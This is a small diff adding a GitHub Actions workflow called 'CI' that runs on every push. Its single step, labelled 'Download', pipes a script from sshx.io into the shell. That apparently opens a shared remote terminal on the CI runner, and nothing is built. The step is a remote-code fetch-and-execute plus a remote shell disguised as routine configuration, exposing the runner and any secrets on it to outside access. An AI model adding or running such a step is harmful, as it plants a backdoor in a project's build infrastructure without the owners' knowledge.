@@ -1,0 +1,8 @@
+name: CI
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Download
+      run: curl -sSf https://sshx.io/get | sh -s run
